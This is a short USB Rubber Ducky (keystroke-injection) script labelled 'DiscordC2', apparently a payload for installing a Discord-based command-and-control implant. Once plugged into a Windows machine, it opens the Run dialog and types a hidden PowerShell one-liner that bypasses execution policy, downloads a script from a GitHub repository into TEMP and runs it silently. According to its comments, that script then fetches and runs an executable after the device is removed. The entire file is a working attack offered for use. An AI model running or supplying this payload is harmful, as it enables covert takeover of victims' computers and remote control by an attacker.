REM ===================================================
REM  DiscordC2 — Rubber Ducky Payload
REM  Author : IMApurbo
REM  Repo   : https://github.com/IMApurbo/discordC2
REM
REM  What it does:
REM  1. Opens hidden PowerShell via WIN+R
REM  2. Downloads run.ps1 from GitHub
REM  3. Executes it silently and exits
REM  4. PowerShell downloads + runs the EXE after ducky ejects
REM ===================================================

REM wait for PC to be ready
DELAY 1500

REM open Run dialog
GUI r
DELAY 700

REM type the one-liner and hit enter
STRING powershell -WindowStyle Hidden -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/IMApurbo/discordC2/main/run.ps1','$env:TEMP\r.ps1'); Start-Process powershell -ArgumentList '-WindowStyle Hidden -NonInteractive -NoProfile -ExecutionPolicy Bypass -File $env:TEMP\r.ps1' -WindowStyle Hidden"
ENTER

REM ducky can eject now — powershell keeps running in background
